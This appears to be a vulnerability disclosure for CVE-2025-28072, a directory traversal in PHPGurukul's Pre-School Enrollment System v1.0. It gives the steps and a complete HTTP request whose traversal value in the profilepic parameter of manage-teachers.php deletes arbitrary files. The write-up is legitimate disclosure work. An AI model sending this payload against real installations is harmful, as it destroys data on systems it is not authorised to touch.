# PHPGurukul Pre-School Enrollment System Project directory traversal vulnerability(CVE-2025-28072)

**PHPGurukul  Pre-School Enrollment System Project introduce**
   
   PHPGurukul Pre-School Enrollment System Project is a web-based pre-school enrollment system by PHPGurukul.   

**Vulnerability description**

   There is a security vulnerability in PHPGurukul Pre-School Enrollment System Project v1.0. The vulnerability is caused by a directory traversal vulnerability, which allows remote attackers to traverse directories and delete traversed files.

 PHPGurukul Project address

   
   https://phpgurukul.com/pre-school-enrollment-system-using-php-and-mysql/

   During the code audit, it was found that there was a problem with profilepic in the manage-teachers.php file   
   ![1](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100513.png)   
   After analyzing the code, we tried to exploit the vulnerability
   
   **Loophole principle**
   
   Log in to the system backend management system
     
   ![2](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100551.png)
      
   Find the vulnerable function in the manage-teachers.php article, manage-teachers-delete
  
   ![3](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100037.png)
  
   Intercept the data packet and find the problematic parameter profilepic
   
   ![4](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100051.png)

   Transformed into attack payload  

    GET /School/preschool/admin/manage-teachers.php?action=delete&&tid=1&&profilepic=../../../../../../aaa.txt HTTP/1.1
    Host: localhost
    Sec-Fetch-User: ?1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br, zstd
    sec-ch-ua-mobile: ?0
    Upgrade-Insecure-Requests: 1
    sec-ch-ua-platform: "Windows"
    Sec-Fetch-Site: same-origin
    Referer: http://localhost/School/preschool/admin/manage-teachers.php
    Accept-Language: zh-CN,zh;q=0.9
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Dest: document
    sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
    Cookie: PHPSESSID=7t2liii8fu23b3cjsll5qi6q8t


   Create aaa.txt test file in the local D drive   
       ![5](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100159.png)   

   Send payload, aaa.txt file has been deleted   
   ![6](https://github.com/baixiaobi/TST/blob/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250210100443.png)    
   This directory traversal vulnerability can cause the traversed files to be deleted.

 **The affected version**   
 PHPGurukul Pre-School Enrollment System Project v1.0    
 Strictly validate and filter all paths entered by users to ensure that only specified files or directories are allowed to be accessed. Regular expressions can be used to restrict the path format.
 
   
